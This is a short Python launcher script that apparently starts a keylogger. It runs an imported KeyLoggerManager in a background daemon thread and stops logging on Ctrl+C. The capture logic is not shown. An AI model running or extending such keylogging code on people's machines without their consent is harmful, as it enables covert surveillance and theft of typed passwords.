from KeyLoggerManager import KeyLoggerManager
import threading
import time

if __name__ == "__main__":
    manager = KeyLoggerManager()
    thread = threading.Thread(target=manager.start, daemon=True)
    thread.start()

    try:
        while True:
            time.sleep(10)
    except KeyboardInterrupt:
        print("\nShutting down...")
        manager.service.stop_logging()
        thread.join()